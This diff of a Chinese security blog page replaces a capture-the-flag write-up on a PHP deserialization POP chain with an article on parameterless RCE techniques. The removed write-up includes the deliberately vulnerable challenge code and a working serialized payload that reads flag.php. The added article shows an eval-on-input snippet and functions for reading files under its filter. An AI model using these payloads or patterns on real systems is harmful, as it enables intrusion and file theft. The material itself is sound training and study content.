@@ -8,13 +8,13 @@
   <meta name="theme-color" content="#fff" id="theme-color">
   <meta name="description" content="Husins">
   <link rel="icon" href="/img/dog.jpg">
-  <title>MRCTF2020之Ezpop</title>
+  <title>浅析无参数RCE</title>
   
   
-  <meta property="og:title" content="MRCTF2020之Ezpop">
+  <meta property="og:title" content="浅析无参数RCE">
   
   
-  <meta property="og:url" content="https://husins.cn/MRCTF2020%E4%B9%8BEzpop/index.html">
+  <meta property="og:url" content="https://husins.cn/%E6%B5%85%E6%9E%90%E6%97%A0%E5%8F%82%E6%95%B0RCE/index.html">
   
   
   <meta property="og:img" content="/img/dog.png">
@@ -22,12 +22,12 @@
   
   
   <meta property="og:type" content="article">
-  <meta property="og:article:published_time" content="2021-01-27">
-  <meta property="og:article:modified_time" content="2021-01-27">
+  <meta property="og:article:published_time" content="2021-02-02">
+  <meta property="og:article:modified_time" content="2021-02-02">
   <meta property="og:article:author" content="Husins">
   
   
-  <meta property="og:article:tag" content="BUUCTF">
+  <meta property="og:article:tag" content="RCE">
   
   
   
@@ -179,23 +179,23 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      MRCTF2020之Ezpop
+      浅析无参数RCE
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-01-27T03:50:59.000Z">
+    <time datetime="2021-02-02T15:08:08.000Z">
       <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
-      <span>2021-01-27</span>
+      <span>2021-02-02</span>
     </time>
     
     <span class="dot"></span>
     
-    <a href="/categories/CTF题解/" class="post-meta-link">CTF题解</a>
+    <a href="/categories/漏洞总结/" class="post-meta-link">漏洞总结</a>
     
     
     
     <span class="dot"></span>
-    <span>865 words</span>
+    <span>744 words</span>
     
   </div>
   
@@ -204,54 +204,93 @@
       <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
       
       
-        <a href="/tags/BUUCTF/" class="post-meta-link">BUUCTF</a>
+        <a href="/tags/RCE/" class="post-meta-link">RCE</a>
       
     </div>
   </div>
   
   </header>
   <div id="section" class="post-content">
-    <p><strong>知识点</strong></p>
-<p>魔术方法<code> __invoke()</code>：当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</p>
-<p>魔术方法<code>__tostring()</code>：将一个对象当做一个字符串来使用时，会自动调用该方法，并且在该方法中，可以返回一定的字符串，以表明该对象转换为字符串之后的结果</p>
-<p>魔术方法<code>__get()</code>：获得一个类的成员变量时调用,通过它可以在对象的外部获取私有成员属性的值,访问不存在的属性或是受限的属性时调用</p>
-<p>序列化Pop链：利用几个类之间相互关联进行构造</p>
-<p><strong>解题</strong></p>
-<p>打开题目，是<code>php</code>的代码,分析代码</p>
-<pre class="highlight"><code class="hljs php">Welcome to index.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    $a=<span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre>
+    <h2 id="什么是无参数RCE"><a href="#什么是无参数RCE" class="headerlink" title="什么是无参数RCE"></a>什么是无参数RCE</h2><pre class="highlight"><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])&#123;<br>    <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>    &#125;<br></code></pre>
 
-<p>一共存在三个类，先来看第一个类</p>
-<pre class="highlight"><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br></code></pre>
+<p>如上，只使用函数，且函数不能带有参数，这里有种种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数。比如：</p>
+<pre class="highlight"><code class="hljs php">a();<br>a(b());<br>a(b(c()));<br></code></pre>
 
-<p><code>append()</code>函数文件包含,注释中提到<code>flag in flag.php</code>因此,这里就是想办法 <code>$value=flag.php</code></p>
-<p>接下来利用魔术方法对函数赋值,因此我们需要,以调用函数的方法调用这个对象完成赋值</p>
-<p>第二个类:</p>
-<pre class="highlight"><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre>
+<h2 id="无参数RCE中的正则"><a href="#无参数RCE中的正则" class="headerlink" title="无参数RCE中的正则"></a>无参数RCE中的正则</h2><p><strong>正则可以分为三个部分：</strong></p>
+<pre><code>1.  `[a-z,_]+\( 直到递归前面可以看作一个匹配整体，用来匹配所有小写字母下划线和左括号`
+2.  `(?R)? 递归部分看作一个匹配整体,效果是用来递归匹配`
+3.  `\) 递归后面的看作一个匹配整体，用来匹配右括号`</code></pre>
+<pre class="highlight"><code class="hljs php">a( <span class="hljs-comment">//匹配上面第一个匹配整体，然后进入第一次递归</span><br>    b( <span class="hljs-comment">//匹配上面第一个匹配整体，进入第二次递归</span><br>        c( <span class="hljs-comment">//匹配上面第一个匹配整体，进入第三次递归</span><br>            <span class="hljs-comment">//没有匹配第一个匹配整体，递归停止</span><br>        ) <span class="hljs-comment">//匹配第二次递归剩下的表达式，即第三个匹配的整体\),</span><br>    )   <span class="hljs-comment">//匹配第一次递归剩下的表达式，即\),</span><br>) <span class="hljs-comment">//匹配原表达式剩下的表达式，即\),</span><br></code></pre>
 
-<p>​                                                                                                                                                                    </p>
-<p><code>__wakeup()</code>反序列化时自动调用,对<code>$this-&gt;source</code>做字符串比较,<code>__toString</code>返回str的source属性</p>
-<p>第三个类:</p>
-<pre class="highlight"><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br></code></pre>
-
-<p><code>__get()</code>把$this-&gt;p当成函数返回</p>
-<p>因此总结pop链的构造:</p>
+<p>*<em>(?R)，(?R)?，(?R)<em>，(?R)+的区别</em></em></p>
+<ol>
+<li><p>(?R) ， (?R)+ 这两个表达式是匹配不到东西的,因为每次匹配的时候都会至少运行一次递归，无法终止，所以匹配不到任何东西。 </p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223342.png" alt="image-20210202223342752" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223342.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223409.png" alt="image-20210202223409570" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223409.png" class="lozad post-image"></p>
+</li>
+</ol>
+<ol start="2">
+<li>(?R)?,递归0次或1次，非贪婪，只能匹配a(b(c()))这种一层套一个函数的。</li>
+</ol>
+<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223054.png" class="lozad post-image"src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223054.png"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223136.png" alt="image-20210202223136407" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223136.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223219.png" alt="image-20210202223219488" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223219.png" class="lozad post-image"></p>
+<ol start="3">
+<li>(?R)*，递归0次或多次，贪婪，可以匹配a(b(c()d()))</li>
+</ol>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223246.png" alt="image-20210202223246625" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223246.png" class="lozad post-image"></p>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p><strong>数组操作</strong></p>
+<p><code>array_flip():</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223946.png" alt="image-20210202223946462" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223946.png" class="lozad post-image"></p>
+<p><code>array_rand:</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223758.png" alt="image-20210202223758505" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202223758.png" class="lozad post-image"></p>
+<p><code>array_reverse:</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202224226.png" alt="image-20210202224226089" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202224226.png" class="lozad post-image"></p>
+<p><strong>数组指针相关操作</strong></p>
 <ul>
-<li>首先实例化show类,此时反序列化会自动调用<code>__wakeup</code>通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是show类，就调用了<code>__toString()</code>方法</li>
-<li><code>__toString</code>会访问<code>str</code>的<code>source</code>属性,当<code>str</code>构造为<code>Test</code>类时,<code>Test</code>类不存在<code>source</code>属性,因此会调用<code>__get</code>方法</li>
-<li><code>__get()</code>方法将p作为函数使用,因此当p实例化为<code>Modifier</code>类时,就可以调用<code>__invoke</code>方法,因此使用伪协议读取<code>flag.php</code></li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.current.php">current()</a> - 返回数组中的当前指针的值，默认是数组第一个元素，别名<code>pos</code></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.end.php">end()</a> - 将数组的内部指针指向最后一个单元</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.key.php">key()</a> - 从关联数组中取得键名</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.each.php">each()</a> - 返回数组中当前的键／值对并将数组指针向前移动一步</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.prev.php">prev()</a> - 将数组的内部指针倒回一位</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.reset.php">reset()</a> - 将数组的内部指针指向第一个单元</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.next.php">next()</a> - 将数组中的内部指针向前移动一位</p>
+</li>
 </ul>
-<p>构造Exp:</p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" alt="image-20210110113435429" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" class="lozad post-image"></p>
-<p>payload:<code>?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22ad%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</code></p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" alt="image-20210110113511734" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127115131.png" class="lozad post-image"></p>
-<p>最终得到Flag</p>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
+<p><strong>其他函数</strong></p>
+<ul>
+<li><code>localeconv()</code> 返回一包含本地数字及货币格式信息的数组。而数组第一项就是”.”</li>
+<li><code>get_defined_vars()</code>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</li>
+<li><code>getenv</code>,获取一个环境变量的值</li>
+</ul>
+<p><strong>文件相关操作函数</strong></p>
+<ul>
+<li><p><code>file_get_contents()</code>将整个文件读入一个字符串</p>
+</li>
+<li><p><code>readfile()</code>读取文件并写入到输出缓冲。</p>
+</li>
+<li><p><code>highlight_file()</code>语法高亮显示一个文件</p>
+</li>
+<li><p><code>scandir(</code> <code>.</code> ), 返回一个数组，包含当前目录下的文件和目录</p>
+</li>
+<li><p><code>getcwd()</code>取得当前工作目录。</p>
+</li>
+<li><p><code>chdir($directory)</code>，将 <code>PHP </code>的当前目录改为 directory。</p>
+</li>
+</ul>
+
   </div>
   <div>
   
   <div class="post-note note-warning copyright" style="margin-top: 42px">
     <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
-    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/MRCTF2020%E4%B9%8BEzpop/">https://husins.cn/MRCTF2020%E4%B9%8BEzpop/</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/%E6%B5%85%E6%9E%90%E6%97%A0%E5%8F%82%E6%95%B0RCE/">https://husins.cn/%E6%B5%85%E6%9E%90%E6%97%A0%E5%8F%82%E6%95%B0RCE/</a></p>
     <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
   </div>
   
@@ -259,25 +298,13 @@
 </article>
 <div class="nav">
   
-  <div class="nav-item-prev">
-    <a href="/GWCTF-2019之枯燥的抽奖/" class="nav-link">
-      <i class="iconfont icon-left nav-prev-icon"></i>
-      <div>
-        <div class="nav-label">Prev</div>
-        
-        <div class="nav-title">GWCTF 2019之枯燥的抽奖 </div>
-        
-      </div>
-    </a>
-  </div>
-  
   
   <div class="nav-item-next">
-    <a href="/BJDCTF2020之EasySearch/" class="nav-link">
+    <a href="/SWPU2019之Web1/" class="nav-link">
       <div>
         <div class="nav-label">Next</div>
         
-        <div class="nav-title">BJDCTF2020之EasySearch </div>
+        <div class="nav-title">SWPU2019之Web1 </div>
         
       </div>
       <i class="iconfont icon-right nav-next-icon"></i>
@@ -288,7 +315,7 @@
 
 <div class="card card-content toc-card" id="mobiletoc">
   <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-text">什么是无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99"><span class="toc-text">无参数RCE中的正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">常用函数</span></a></li></ol>
 </div></main>
           <aside class="left-column">
             
@@ -321,7 +348,7 @@
   <article class="display-when-two-columns spacer">
     <div class="card card-content toc-card">
       <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-text">什么是无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99"><span class="toc-text">无参数RCE中的正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">常用函数</span></a></li></ol>
     </div>
   </article>
   
@@ -392,7 +419,7 @@
   
   <article class="card card-content toc-card">
     <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-text">什么是无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99"><span class="toc-text">无参数RCE中的正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">常用函数</span></a></li></ol>
   </article>
   
   
